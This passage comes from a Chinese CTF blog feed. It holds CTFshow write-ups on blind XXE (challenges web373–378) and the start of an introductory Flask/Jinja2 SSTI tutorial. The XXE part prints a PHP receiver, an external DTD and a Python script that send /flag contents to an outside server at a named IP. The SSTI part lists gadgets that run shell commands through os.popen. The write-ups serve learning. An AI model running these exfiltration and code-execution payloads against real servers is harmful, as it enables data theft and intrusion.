variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></code></pre><p>Ê≤°ÊúâÂõûÊòæÔºåË¶ÅÊääËØªÂèñÂà∞ÁöÑÂÜÖÂÆπ‰πüÂ∞±ÊòØflag‰º†Âà∞ËøúÁ®ãÊúçÂä°Âô®Êü•Áúã</p><p>Âú®ÊúçÂä°Âô®‰∏äÂàõÂª∫<code>xxe.php</code>Âíå<code>payload.dtd</code>Êñá‰ª∂</p><pre class="language-php" data-language="php"><code class="language-php"># xxe.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xxe</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">,</span><span class="token variable">$xxe</span><span class="token punctuation">,</span><span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd"># payload.dtd&lt;!ENTITY % all&quot;&lt;!ENTITY &#x25; send SYSTEM &#39;http:&#x2F;&#x2F;xxx&#x2F;xxe.php?q&#x3D;%file;&#39;&gt;&quot;&gt;%all;</code></pre><p>ÁÑ∂ÂêéÂèëÈÄÅPOSTËØ∑Ê±Ç</p><pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;payload.dtd&quot;&gt;%dtd;%send;] &gt;</code></pre><h4 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?xml version="1\.0"/'</span><span class="token punctuation">,</span> <span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></code></pre><p>Áõ∏ËæÉ‰∫é‰∏äÈ¢òÔºåÂ§ö‰∫Ü‰∏Ä‰∏™Ê≠£ÂàôË°®ËææÂºèÔºåËøáÊª§‰∫Ü<code>&lt;?xml version=&quot;1.0&quot;</code>Ëøô‰∏™Â≠óÁ¨¶‰∏≤</p><p>ÂèØ‰ª•Â§öÊâìÂá†‰∏™Á©∫Ê†ºÁªïËøáÊàñËÄÖÁõ¥Êé•‰∏çÂÜôÂ£∞Êòé‰πüÂèØ‰ª•</p><p>‰∏äÈ¢òÂÅöÊ≥ïÂêåÊ†∑ÂèØ‰ª•</p><h4 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h4><p>Áõ∏ËæÉ‰∫é‰∏äÈ¢òÔºåËøáÊª§‰∫Ü<code>&lt;?xml version=&quot;1.0&quot;</code>Ëøô‰∏™Â≠óÁ¨¶‰∏≤ÂêåÊó∂Ôºå<code>/i</code>Ê®°ÂºèÊääÂ§ßÂ∞èÂÜôÈÉΩËøáÊª§‰∫Ü„ÄÇ</p><p>‰æùÊóß‰ª•‰∏äÊñπÊ≥ï</p><h4 id="web377-UTF-16"><a href="#web377-UTF-16" class="headerlink" title="web377(UTF-16)"></a>web377(UTF-16)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?xml version="1\.0"|http/i'</span><span class="token punctuation">,</span> <span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   </span></code></pre><p>ËøáÊª§‰∫Ühttp</p><p>ÂèØ‰ª•Áî®UTF-16ÁªïËøá</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://ee601bc7-6229-49ad-af80-541d5a0b662c.challenge.ctf.show/'</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">&lt;!ENTITY % dtd SYSTEM "http://156.238.233.95/xxe/payload.dtd">%dtd;%send;] >"""</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"done!"</span><span class="token punctuation">)</span></code></pre><h4 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h4><p>ÂºÄÂßãÊòØ‰∏™ÁôªÂΩïÊ°ÜÔºåÈöè‰æøËæìÂÖ•ÂêéÊäìÂåÖ</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY hsad SYSTEM "file:///flag"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&hsad;">&amp;hsad;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&hsad;">&amp;hsad;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>Áõ¥Êé•ÊâìÂ∞±Ë°å</p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webÂÖ•Èó®-ssti</title>
      <link href="/2024/08/05/web%E5%85%A5%E9%97%A8-ssti/"/>
      <url>/2024/08/05/web%E5%85%A5%E9%97%A8-ssti/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h3><p>SSTI‰∏ªË¶Å‰∏∫pythonÁöÑ‰∏Ä‰∫õÊ°ÜÊû∂ jinja2 mako tornado djangoÔºåPHPÊ°ÜÊû∂smarty twigÔºåjavaÊ°ÜÊû∂jade velocityÁ≠âÁ≠â‰ΩøÁî®‰∫ÜÊ∏≤ÊüìÂáΩÊï∞Êó∂ÔºåÁî±‰∫é‰ª£Á†Å‰∏çËßÑËåÉÊàñ‰ø°‰ªª‰∫ÜÁî®Êà∑ËæìÂÖ•ËÄåÂØºËá¥‰∫ÜÊúçÂä°Á´ØÊ®°ÊùøÊ≥®ÂÖ•ÔºåÊ®°ÊùøÊ∏≤ÊüìÂÖ∂ÂÆûÂπ∂Ê≤°ÊúâÊºèÊ¥ûÔºå‰∏ªË¶ÅÊòØÁ®ãÂ∫èÂëòÂØπ‰ª£Á†Å‰∏çËßÑËåÉ‰∏ç‰∏•Ë∞®ÈÄ†Êàê‰∫ÜÊ®°ÊùøÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÈÄ†ÊàêÊ®°ÊùøÂèØÊéß„ÄÇ</p><p><a href="https://blog.csdn.net/qq_51096893/article/details/122020518">Bugku CTF‚Äî‚ÄîWEB‰πãSSTIÂ≠¶‰π†Á¨îËÆ∞_ctf ssti-CSDNÂçöÂÆ¢</a></p><p><a href="https://www.cnblogs.com/dojo-lzz/p/5518474.html">ÊµÖË∞àÊ®°ÊùøÂºïÊìé - Êú®ÁöÑÊ†ë - ÂçöÂÆ¢Âõ≠</a></p><p><a href="https://xz.aliyun.com/t/3679">flask‰πãsstiÊ®°ÁâàÊ≥®ÂÖ•‰ªéÈõ∂Âà∞ÂÖ•Èó®</a></p><h4 id="FlaskÔºö"><a href="#FlaskÔºö" class="headerlink" title="FlaskÔºö"></a>FlaskÔºö</h4><p>FlaskÊòØ‰∏Ä‰∏™PythonÁºñÂÜôÁöÑWeb ÂæÆÊ°ÜÊû∂ÔºåËÆ©Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®PythonËØ≠Ë®ÄÂø´ÈÄüÂÆûÁé∞‰∏Ä‰∏™ÁΩëÁ´ôÊàñWebÊúçÂä°ÔºåÂú®‰ªãÁªçFlask‰πãÂâçÈ¶ñÂÖàÊù•ËÅä‰∏ãÂÆÉÂíåDjangoÁöÑËÅîÁ≥ª‰ª•ÂèäÂå∫Âà´Ôºådjango‰∏™Â§ßËÄåÂÖ®ÁöÑwebÊ°ÜÊû∂ÔºåÂÆÉÂÜÖÁΩÆËÆ∏Â§öÊ®°ÂùóÔºåflaskÊòØ‰∏Ä‰∏™Â∞èËÄåÁ≤æÁöÑËΩªÈáèÁ∫ßÊ°ÜÊû∂ÔºåDjangoÂäüËÉΩÂ§ßËÄåÂÖ®ÔºåFlaskÂè™ÂåÖÂê´Âü∫Êú¨ÁöÑÈÖçÁΩÆ, DjangoÁöÑ‰∏ÄÁ´ôÂºèËß£ÂÜ≥ÁöÑÊÄùË∑ØÔºåËÉΩËÆ©ÂºÄÂèëËÄÖ‰∏çÁî®Âú®ÂºÄÂèë‰πãÂâçÂ∞±Âú®ÈÄâÊã©Â∫îÁî®ÁöÑÂü∫Á°ÄËÆæÊñΩ‰∏äËä±Ë¥πÂ§ßÈáèÊó∂Èó¥„ÄÇDjangoÊúâÊ®°ÊùøÔºåË°®ÂçïÔºåË∑ØÁî±ÔºåÂü∫Êú¨ÁöÑÊï∞ÊçÆÂ∫ìÁÆ°ÁêÜÁ≠âÁ≠âÂÜÖÂª∫ÂäüËÉΩ„ÄÇ‰∏é‰πãÁõ∏ÂèçÔºåFlaskÂè™ÊòØ‰∏Ä‰∏™ÂÜÖÊ†∏ÔºåÈªòËÆ§‰æùËµñ‰∫é2‰∏™Â§ñÈÉ®Â∫ìÔºö Jinja2 Ê®°ÊùøÂºïÊìéÂíå WSGIÂ∑•ÂÖ∑ÈõÜ‚ÄìWerkzeug , flaskÁöÑ‰ΩøÁî®ÁâπÁÇπÊòØÂü∫Êú¨ÊâÄÊúâÁöÑÂ∑•ÂÖ∑‰ΩøÁî®ÈÉΩ‰æùËµñ‰∫éÂØºÂÖ•ÁöÑÂΩ¢ÂºèÂéªÊâ©Â±ïÔºåflaskÂè™‰øùÁïô‰∫ÜwebÂºÄÂèëÁöÑÊ†∏ÂøÉÂäüËÉΩ„ÄÇ</p><p><img src="begin_1.png" alt="img" loading="lazy"></p><p><img src="begin_2.png" alt="img" loading="lazy"></p><h4 id="PythonÈ≠îÊúØÊñπÊ≥ï"><a href="#PythonÈ≠îÊúØÊñπÊ≥ï" class="headerlink" title="PythonÈ≠îÊúØÊñπÊ≥ï"></a>PythonÈ≠îÊúØÊñπÊ≥ï</h4><p><strong>class</strong>#Êü•ÊâæÂΩìÂâçÁ±ªÂûãÁöÑÊâÄÂ±ûÂØπË±°</p><p><strong>base</strong>_# Ê≤øÁùÄÁà∂Â≠êÁ±ªÁöÑÂÖ≥Á≥ªÂæÄ‰∏äËµ∞‰∏Ä‰∏™</p><p><strong>mro</strong> # Êü•ÊâæÂΩìÂâçÁ±ªÂØπË±°ÁöÑÊâÄÊúâÁªßÊâøÁ±ª</p><p><strong>subclasses</strong> ()# Êü•ÊâæÁà∂Á±ª‰∏ãÁöÑÊâÄÊúâÂ≠êÁ±ª</p><p><strong>init</strong> #Êü•ÁúãÁ±ªÊòØÂê¶ÈáçËΩΩÔºåÈáçËΩΩÊòØÊåáÁ®ãÂ∫èÂú®ËøêË°åÊó∂Â∞±Â∑≤ÁªèÂä†ËΩΩÂ•Ω‰∫ÜËøô‰∏™Ê®°ÂùóÂà∞ÂÜÖÂ≠ò‰∏≠Â¶ÇÊûúÂá∫Áé∞wrapperÂ≠óÁúºÔºåËØ¥ÊòéÊ≤°ÊúâÈáçËΩΩ</p><p><strong>globals</strong> #ÂáΩÊï∞‰ºöËÆÆÂ≠óÂÖ∏ÁöÑÂΩ¢ÂºèËøîÂõûÂΩìÂâçÂØπË±°ÁöÑÂÖ®ÈÉ®ÂÖ®Â±ÄÂèòÈáè</p><p><img src="begin_3.png" alt="img" loading="lazy"></p><p><strong>jinjiaÊ†ºÂºè</strong></p><pre class="language-python" data-language="python"><code class="language-python">ÊéßÂà∂ÁªìÊûÑ <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>ÂèòÈáèÂèñÂÄº <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Ê≥®Èáä <span class="token punctuation">&#123;</span><span class="token comment"># #&#125;</span></code></pre><p><strong>‰∫ÜËß£pythonÁöÑÂá†‰∏™ÂáΩÊï∞Ëß£Êûê</strong></p><pre class="language-python" data-language="python"><code class="language-python">__class__            Á±ªÁöÑ‰∏Ä‰∏™ÂÜÖÁΩÆÂ±ûÊÄßÔºåË°®Á§∫ÂÆû‰æãÂØπË±°ÁöÑÁ±ª„ÄÇ__base__             Á±ªÂûãÂØπË±°ÁöÑÁõ¥Êé•Âü∫Á±ª__bases__            Á±ªÂûãÂØπË±°ÁöÑÂÖ®ÈÉ®Âü∫Á±ªÔºå‰ª•ÂÖÉÁªÑÂΩ¢ÂºèÔºåÁ±ªÂûãÁöÑÂÆû‰æãÈÄöÂ∏∏Ê≤°ÊúâÂ±ûÊÄß __bases____mro__              Ê≠§Â±ûÊÄßÊòØÁî±Á±ªÁªÑÊàêÁöÑÂÖÉÁªÑÔºåÂú®ÊñπÊ≥ïËß£ÊûêÊúüÈó¥‰ºöÂü∫‰∫éÂÆÉÊù•Êü•ÊâæÂü∫Á±ª„ÄÇ__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>     ËøîÂõûËøô‰∏™Á±ªÁöÑÂ≠êÁ±ªÈõÜÂêàÔºåEach <span class="token keyword">class</span> <span class="token class-name">keeps</span> a <span class="token builtin">list</span> of weak references to its immediate subclasses<span class="token punctuation">.</span> This method returns a <span class="token builtin">list</span> of <span class="token builtin">all</span> those references still alive<span class="token punctuation">.</span> The <span class="token builtin">list</span> <span class="token keyword">is</span> <span class="token keyword">in</span> definition order<span class="token punctuation">.</span>__init__             ÂàùÂßãÂåñÁ±ªÔºåËøîÂõûÁöÑÁ±ªÂûãÊòØfunction__globals__          ‰ΩøÁî®ÊñπÂºèÊòØ ÂáΩÊï∞Âêç<span class="token punctuation">.</span>__globals__Ëé∑ÂèñfunctionÊâÄÂ§ÑÁ©∫Èó¥‰∏ãÂèØ‰ΩøÁî®ÁöÑmodule„ÄÅÊñπÊ≥ï‰ª•ÂèäÊâÄÊúâÂèòÈáè„ÄÇ__dic__              Á±ªÁöÑÈùôÊÄÅÂáΩÊï∞„ÄÅÁ±ªÂáΩÊï∞„ÄÅÊôÆÈÄöÂáΩÊï∞„ÄÅÂÖ®Â±ÄÂèòÈáè‰ª•Âèä‰∏Ä‰∫õÂÜÖÁΩÆÁöÑÂ±ûÊÄßÈÉΩÊòØÊîæÂú®Á±ªÁöÑ__dict__Èáå__getattribute__<span class="token punctuation">(</span><span class="token punctuation">)</span>   ÂÆû‰æã„ÄÅÁ±ª„ÄÅÂáΩÊï∞ÈÉΩÂÖ∑ÊúâÁöÑ__getattribute__È≠îÊúØÊñπÊ≥ï„ÄÇ‰∫ãÂÆû‰∏äÔºåÂú®ÂÆû‰æãÂåñÁöÑÂØπË±°ËøõË°å<span class="token punctuation">.</span>Êìç‰ΩúÁöÑÊó∂ÂÄôÔºàÂΩ¢Â¶ÇÔºöa<span class="token punctuation">.</span>xxx<span class="token operator">/</span>a<span class="token punctuation">.</span>xxx<span class="token punctuation">(</span><span class="token punctuation">)</span>ÔºâÔºåÈÉΩ‰ºöËá™Âä®ÂéªË∞ÉÁî®__getattribute__ÊñπÊ≥ï„ÄÇÂõ†Ê≠§Êàë‰ª¨ÂêåÊ†∑ÂèØ‰ª•Áõ¥Êé•ÈÄöËøáËøô‰∏™ÊñπÊ≥ïÊù•Ëé∑ÂèñÂà∞ÂÆû‰æã„ÄÅÁ±ª„ÄÅÂáΩÊï∞ÁöÑÂ±ûÊÄß„ÄÇ__getitem__<span class="token punctuation">(</span><span class="token punctuation">)</span>        Ë∞ÉÁî®Â≠óÂÖ∏‰∏≠ÁöÑÈîÆÂÄºÔºåÂÖ∂ÂÆûÂ∞±ÊòØË∞ÉÁî®Ëøô‰∏™È≠îÊúØÊñπÊ≥ïÔºåÊØîÂ¶Ça<span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span>ÔºåÂ∞±ÊòØa<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>__builtins__         ÂÜÖÂª∫ÂêçÁß∞Á©∫Èó¥ÔºåÂÜÖÂª∫ÂêçÁß∞Á©∫Èó¥ÊúâËÆ∏Â§öÂêçÂ≠óÂà∞ÂØπË±°‰πãÈó¥Êò†Â∞ÑÔºåËÄåËøô‰∫õÂêçÂ≠óÂÖ∂ÂÆûÂ∞±ÊòØÂÜÖÂª∫ÂáΩÊï∞ÁöÑÂêçÁß∞ÔºåÂØπË±°Â∞±ÊòØËøô‰∫õÂÜÖÂª∫ÂáΩÊï∞Êú¨Ë∫´„ÄÇÂç≥ÈáåÈù¢ÊúâÂæàÂ§öÂ∏∏Áî®ÁöÑÂáΩÊï∞„ÄÇ__builtins__‰∏é__builtin__ÁöÑÂå∫Âà´Â∞±‰∏çÊîæ‰∫ÜÔºåÁôæÂ∫¶ÈÉΩÊúâ„ÄÇ<span class="token builtin">__import__</span>           Âä®ÊÄÅÂä†ËΩΩÁ±ªÂíåÂáΩÊï∞Ôºå‰πüÂ∞±ÊòØÂØºÂÖ•Ê®°ÂùóÔºåÁªèÂ∏∏Áî®‰∫éÂØºÂÖ•osÊ®°ÂùóÔºå<span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span>            ËøîÂõûÊèèÂÜôËøô‰∏™ÂØπË±°ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂèØ‰ª•ÁêÜËß£ÊàêÂ∞±ÊòØÊâìÂç∞Âá∫Êù•„ÄÇurl_for              flaskÁöÑ‰∏Ä‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®‰∫éÂæóÂà∞__builtins__ÔºåËÄå‰∏îurl_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>Âê´Êúâcurrent_app„ÄÇget_flashed_messages flaskÁöÑ‰∏Ä‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®‰∫éÂæóÂà∞__builtins__ÔºåËÄå‰∏îurl_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span>Âê´Êúâcurrent_app„ÄÇlipsum               flaskÁöÑ‰∏Ä‰∏™ÊñπÊ≥ïÔºåÂèØ‰ª•Áî®‰∫éÂæóÂà∞__builtins__ÔºåËÄå‰∏îlipsum<span class="token punctuation">.</span>__globals__Âê´ÊúâosÊ®°ÂùóÔºö<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>current_app          Â∫îÁî®‰∏ä‰∏ãÊñáÔºå‰∏Ä‰∏™ÂÖ®Â±ÄÂèòÈáè„ÄÇrequest              ÂèØ‰ª•Áî®‰∫éËé∑ÂèñÂ≠óÁ¨¶‰∏≤Êù•ÁªïËøáÔºåÂåÖÊã¨‰∏ãÈù¢Ëøô‰∫õÔºåÂºïÁî®‰∏Ä‰∏ãÁæΩÂ∏àÂÇÖÁöÑ„ÄÇÊ≠§Â§ñÔºåÂêåÊ†∑ÂèØ‰ª•Ëé∑Âèñ<span class="token builtin">open</span>ÂáΩÊï∞<span class="token punctuation">:</span>request<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/proc\self\fd/3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>x1    get‰º†ÂèÇrequest<span class="token punctuation">.</span>values<span class="token punctuation">.</span>x1  ÊâÄÊúâÂèÇÊï∞request<span class="token punctuation">.</span>cookies      cookiesÂèÇÊï∞request<span class="token punctuation">.</span>headers      ËØ∑Ê±ÇÂ§¥ÂèÇÊï∞request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>x1    post‰º†ÂèÇ<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>applicaation<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencodedÊàñmultipart<span class="token operator">/</span>form<span class="token operator">-</span>data<span class="token punctuation">)</span>request<span class="token punctuation">.</span>data   post‰º†ÂèÇ<span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span>a<span class="token operator">/</span>b<span class="token punctuation">)</span>request<span class="token punctuation">.</span>json post‰º†json  <span class="token punctuation">(</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>json<span class="token punctuation">)</span>config               ÂΩìÂâçapplicationÁöÑÊâÄÊúâÈÖçÁΩÆ„ÄÇÊ≠§Â§ñÔºå‰πüÂèØ‰ª•ËøôÊ†∑<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>g                    <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>g<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ÂæóÂà∞<span class="token operator">&lt;</span>flask<span class="token punctuation">.</span>g of <span class="token string">'flask_ssti'</span><span class="token operator">></span></code></pre><h4 id="‰∏Ä‰∫õÂà©Áî®ËØ≠Âè•"><a href="#‰∏Ä‰∫õÂà©Áî®ËØ≠Âè•" class="headerlink" title="‰∏Ä‰∫õÂà©Áî®ËØ≠Âè•"></a>‰∏Ä‰∫õÂà©Áî®ËØ≠Âè•</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Ëé∑Âæó‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÂÆû‰æã</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token string">''</span><span class="token comment"># Ëé∑ÂæóÂ≠óÁ¨¶‰∏≤ÁöÑtypeÂÆû‰æã</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__ <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token comment"># Ëé∑ÂæóÂÖ∂Áà∂Á±ª</span><span class="token operator">>></span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token builtin">type</span> <span class="token 